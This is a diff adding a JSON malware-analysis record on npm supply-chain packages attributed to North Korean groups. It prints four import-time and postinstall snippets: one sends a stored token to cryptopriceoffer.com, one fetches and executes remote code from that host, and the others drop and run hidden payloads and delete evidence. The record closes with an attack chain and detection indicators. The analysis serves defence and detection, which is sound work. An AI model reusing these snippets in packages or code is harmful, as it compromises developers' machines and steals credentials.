@@ -1,0 +1,177 @@
+{
+  "package_info": {
+    "package_name": "Unknown (multiple malicious npm packages, see report for campaign details)",
+    "package_manager": "npm",
+    "package_versions": "Multiple, published between Sep 2023 and Apr 2024",
+    "why_malicious": "These packages are designed to execute arbitrary code on installation or import, exfiltrate data, download and execute further payloads, and evade detection through obfuscation and anti-forensics. They are attributed to North Korean state-sponsored actors (Jade Sleet, Moonstone Sleet) and are part of a coordinated supply chain attack campaign."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "import-time",
+        "file_location": "index.js (first package in Jade Sleet pair)",
+        "required_permissions": [
+          "filesystem",
+          "network"
+        ]
+      },
+      "code_snippet": "const os = require('os');\nconst path = require('path');\nvar fs = require('fs');\n\nfunction checksvn(version, projectUrl) {\n  var request = require('sync-request');\n  var res = request('GET', projectUrl);\n  fs.writeFileSync(version, res.getBody());\n}\n\nprocess.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;\n\nvar dir = os.homedir() + '/.svnlook';\nif (!fs.existsSync(dir)){\n  fs.mkdirSync(dir);\n}\nchecksvn(path.join(dir, 'svntoken'), 'https://cryptopriceoffer.com/checkupdate.php');",
+      "code_language": "javascript",
+      "code_behavior": "At import-time, the code creates a hidden directory in the user's home folder, downloads a file from a remote server, and writes it to disk, laying groundwork for further malicious activity.",
+      "malice_analysis": {
+        "why_suspicious": "The code creates a hidden directory and downloads a file from an external domain without user consent.",
+        "violated_expectations": "Normal npm packages should not create hidden directories or fetch remote files on import.",
+        "similar_legitimate_use": "Some legitimate updaters or CLI tools may fetch updates, but not at import-time in a library context.",
+        "key_indicators": [
+          "Hidden directory creation",
+          "Network request to suspicious domain",
+          "Writing arbitrary data to disk"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "import-time",
+        "file_location": "index.js (second package in Jade Sleet pair)",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "child_process"
+        ]
+      },
+      "code_snippet": "const os = require('os');\nconst path = require('path');\nvar fs = require('fs');\n\nfunction getsvnroot(domain, entry, token, path) {\n  const https = require('https');\n  const querystring = require('querystring');\n\n  const options = {\n    hostname: domain,\n    port: 443,\n    path: entry,\n    method: 'POST',\n    headers: { 'content-type': 'application/x-www-form-urlencoded' },\n  };\n\n  const req = https.request(options, (resp) => {\n    let data = '';\n    resp.on('data', (chunk) => {\n      data += chunk;\n    });\n    resp.on('end', () => {\n      fs.writeFileSync(path, data);\n      const { exec } = require('child_process');\n      exec('node ' + path, (error, stdout, stderr) => {});\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(e.message);\n  });\n  req.write(token);\n  req.end();\n}\n\nprocess.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;\n\nvar dir = path.join(os.homedir(), '.svnlook');\nif (fs.existsSync(dir)){\n  const token = fs.readFileSync(path.join(dir, 'svntoken'), {\n    encoding: 'utf8',\n    flag: 'r',\n  });\n  getsvnroot(\n    'cryptopriceoffer.com',\n    '/getupdate.php',\n    token,\n    path.join(dir, 'checksvn.js')\n  );\n}",
+      "code_language": "javascript",
+      "code_behavior": "At import-time, the code reads a token from disk, sends it to a remote server, writes the server's response as a new JavaScript file, and immediately executes it, enabling remote code execution.",
+      "malice_analysis": {
+        "why_suspicious": "The code exfiltrates a token, downloads and executes code from a remote server.",
+        "violated_expectations": "Normal packages should not execute downloaded code or exfiltrate data on import.",
+        "similar_legitimate_use": "Dynamic plugin systems may fetch code, but not in this hidden, automatic, and untrusted manner.",
+        "key_indicators": [
+          "Remote code execution",
+          "Network exfiltration",
+          "Immediate execution of downloaded code"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "postinstall",
+        "file_location": "index.js (Moonstone Sleet single-package, Windows payload)",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "child_process"
+        ]
+      },
+      "code_snippet": "const os = require('os');\nconst fs = require('fs');\nconst { exec } = require('child_process');\n// Get the operating system type\nconst osType = os.type();\n\nconst data = '@echo off\\n...'; // (truncated for brevity, see report)\nconst psdata = '...'; // (PowerShell payload, see report)\n\nif (osType === \"Windows_NT\") {\n  // The system is running Windows\n  const fileName = \"preinstall.bat\";\n  const psfileName = \"preinstall.ps1\";\n  // Create the file\n  fs.writeFile(fileName, data, (err) => {\n    if (!err) {\n      fs.writeFile(psfileName, psdata, (err) => {\n        if (!err) {\n          // Execute the .bat file\n          const child = exec(`${fileName}:`, (error, stdout, stderr) => {\n            if (error) {\n              return;\n            }\n            if (stderr) {\n              return;\n            }\n            fs.unlink(fileName, (err) => {});\n          });\n        }\n      });\n    }\n  });\n}",
+      "code_language": "javascript (with embedded batch and PowerShell)",
+      "code_behavior": "At postinstall, the code writes and executes batch and PowerShell scripts that download a file from a remote server, decrypt it, rename and execute it, then delete evidence and replace package.json with a clean version.",
+      "malice_analysis": {
+        "why_suspicious": "The code downloads and executes remote payloads, performs anti-forensics, and manipulates package files.",
+        "violated_expectations": "Normal postinstall scripts should not download, decrypt, and execute binaries or clean up evidence.",
+        "similar_legitimate_use": "Some legitimate installers may fetch dependencies, but not in this obfuscated, multi-stage, and anti-forensic manner.",
+        "key_indicators": [
+          "Remote payload download",
+          "Decryption and execution of binaries",
+          "Immediate file deletion and package.json replacement"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "postinstall",
+        "file_location": "index.js (Moonstone Sleet, Linux payload, Q2 2024)",
+        "required_permissions": [
+          "filesystem",
+          "child_process"
+        ]
+      },
+      "code_snippet": "if (type == \"linux\") {\n  exec(\"mkdir ~/Library/Application\\ Support/UpdateProvider\");\n  exec(\"cp ./test-config.ts ~/Library/Application\\ Support/UpdateProvider/updateMacOs\");\n  exec(\"sh -c 'nohup ~/Library/Application\\ Support/UpdateProvider/updateMacOs >/dev/null 2>&1 &'\");\n  exec(\"rm deference.js\");\n}",
+      "code_language": "javascript (with shell commands)",
+      "code_behavior": "At postinstall, if running on Linux, the code creates a hidden directory, copies a file as a disguised binary, executes it in the background, and deletes the original script to cover tracks.",
+      "malice_analysis": {
+        "why_suspicious": "The code executes hidden binaries and deletes evidence, indicating anti-forensics and persistence.",
+        "violated_expectations": "Normal npm packages should not execute background binaries or self-delete scripts.",
+        "similar_legitimate_use": "Rare in legitimate packages; some updaters may run background processes, but not with this level of obfuscation.",
+        "key_indicators": [
+          "Background execution of disguised binaries",
+          "Self-deletion of scripts",
+          "Hidden directory usage"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Initial package installation or import triggers execution of malicious code.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_3",
+        "snippet_4"
+      ],
+      "leads_to": "Establishes persistence, downloads or prepares for further payload delivery."
+    },
+    {
+      "step": 2,
+      "action": "Hidden directories and files are created to store tokens or payloads.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_4"
+      ],
+      "leads_to": "Preparation for exfiltration or further code execution."
+    },
+    {
+      "step": 3,
+      "action": "Sensitive data or tokens are exfiltrated to remote servers.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Remote server can deliver tailored payloads or collect credentials."
+    },
+    {
+      "step": 4,
+      "action": "Remote code or binaries are downloaded, decrypted, and executed.",
+      "implemented_by": [
+        "snippet_2",
+        "snippet_3",
+        "snippet_4"
+      ],
+      "leads_to": "Full compromise of the system, execution of attacker-controlled code."
+    },
+    {
+      "step": 5,
+      "action": "Anti-forensics: temporary files and evidence are deleted, package.json is replaced.",
+      "implemented_by": [
+        "snippet_3",
+        "snippet_4"
+      ],
+      "leads_to": "Reduces likelihood of detection and analysis."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Creation of hidden directories (e.g., ~/.svnlook, ~/Library/Application Support/UpdateProvider)",
+      "Network requests to suspicious or hardcoded domains during install/import",
+      "Immediate execution of downloaded or dynamically written code",
+      "Self-deletion of scripts or replacement of package.json",
+      "Background execution of disguised binaries"
+    ],
+    "file_indicators": [
+      ".svnlook directory in user home",
+      "preinstall.bat, preinstall.ps1, preinstall.db, sql.tmp, updateMacOs",
+      "package.json replacement after install",
+      "deference.js self-deletion"
+    ],
+    "network_indicators": [
+      "cryptopriceoffer.com",
+      "103.179.142.171",
+      "Other hardcoded C2 domains/IPs in npm packages"
+    ],
+    "how_to_detect": "Monitor for npm packages that create hidden directories, make network requests to untrusted domains during install/import, or execute child processes. Flag packages that write and execute files from remote sources, especially if they delete evidence or replace package.json. Use YARA rules or EDR to detect suspicious postinstall/import-time behaviors and file system changes."
+  }
+}
